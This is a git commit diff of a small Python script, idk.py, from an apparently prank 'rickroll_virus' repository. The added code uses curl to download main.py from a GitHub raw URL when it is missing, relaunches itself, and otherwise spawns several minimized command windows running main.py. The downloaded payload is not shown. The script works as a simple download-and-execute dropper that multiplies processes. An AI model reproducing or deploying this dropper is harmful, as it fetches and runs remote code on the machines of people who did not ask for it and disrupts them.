50a1889edac2fd32992f28e41c34f4aec1e3879d
rauldhs <67503991+rauldhs@users.noreply.github.com>
2022-08-10 03:11:00 +0300

    Update idk.py

--- idk.py
+++ idk.py
@@ -1,8 +1,17 @@
 import os
+from os.path import exists
 
-for i in range(0,5):
-    os.system("start /min  cmd /c cd Documents/programing_shit/rickroll_virus")
-    os.system("start /min  cmd /c python main.py")
+if not exists(os.getcwd() + "/main.py"):
+    os.system("start  cmd /c cd " + os.getcwd())
+    os.system("start  cmd /c curl -o main.py https://raw.githubusercontent.com/rauldhs/rickroll_virus/main/main.py")
+    os.system("start /min  cmd /c python idk.py")
+else:
+    for i in range(0,5):
+        os.system("start /min  cmd /c python main.py")
+
+    os.system("start  cmd /c python main.py")
+
+
 
 
 
